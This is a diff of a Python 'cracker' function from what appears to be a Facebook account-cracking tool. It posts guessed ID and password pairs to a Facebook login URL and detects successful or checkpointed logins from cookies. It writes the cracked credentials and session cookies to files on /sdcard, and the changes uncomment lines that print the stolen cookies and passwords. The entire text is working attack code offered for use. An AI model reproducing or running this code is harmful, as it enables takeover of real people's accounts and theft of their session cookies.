@@ -2478,7 +2478,7 @@ def cracker(uid, pwx, tl):
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
+            url = "https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
             po = ses.post(url, data=data, headers=headers).text
             response = ses.cookies.get_dict().keys()
             if "c_user" in response:
@@ -2492,7 +2492,7 @@ def cracker(uid, pwx, tl):
                         break
                     else:
                         print(f" {green}(SUMON-OK) {cid}|{pw} ")
-                       #print(f" {white}Cookie : {green}{coki}")
+                        print(f" {white}Cookie : {green}{coki}")
                         open("/sdcard/SUMON-Number-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         oks.append(cid)
                         break
@@ -2501,7 +2501,7 @@ def cracker(uid, pwx, tl):
             elif 'checkpoint' in response:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:156]
-                #print('\33[1;91m[SUMON-CP] '+uid+' | '+pw+'\33[0;97m')
+                print('\33[1;91m[SUMON-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/SUMON-Cp.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
